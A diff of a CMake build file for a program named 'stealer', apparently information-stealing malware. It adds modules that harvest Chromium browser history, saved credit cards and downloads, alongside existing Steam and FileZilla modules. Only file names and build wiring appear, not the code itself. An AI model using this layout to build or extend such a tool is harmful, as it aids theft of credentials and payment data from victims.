@@ -48,8 +48,8 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/games/Games.h
         src/stealer/impl/games/impl/Steam.cpp
         src/stealer/impl/games/impl/Steam.h
-        src/utils/chromuim/ChromuimUtil.cpp
-        src/utils/chromuim/ChromuimUtil.h
+        src/utils/chromuim/ChromiumUtil.cpp
+        src/utils/chromuim/ChromiumUtil.h
         src/utils/Base64Util.cpp
         src/utils/Base64Util.h
         include/sqlite3.c
@@ -68,6 +68,16 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/FileZilla.h
         src/utils/FilesUtil.cpp
         src/utils/FilesUtil.h
+        src/stealer/impl/brownsers/chromium/ChromiumBrowsers.cpp
+        src/stealer/impl/brownsers/chromium/ChromiumBrowsers.h
+        src/stealer/impl/brownsers/chromium/impl/CHistory.cpp
+        src/stealer/impl/brownsers/chromium/impl/CHistory.h
+        src/stealer/impl/brownsers/BrowserModule.h
+        src/stealer/impl/brownsers/Browsers.h
+        src/stealer/impl/brownsers/chromium/impl/CCreditCards.cpp
+        src/stealer/impl/brownsers/chromium/impl/CCreditCards.h
+        src/stealer/impl/brownsers/chromium/impl/CDownloads.cpp
+        src/stealer/impl/brownsers/chromium/impl/CDownloads.h
 )
 
 target_link_libraries(stealer
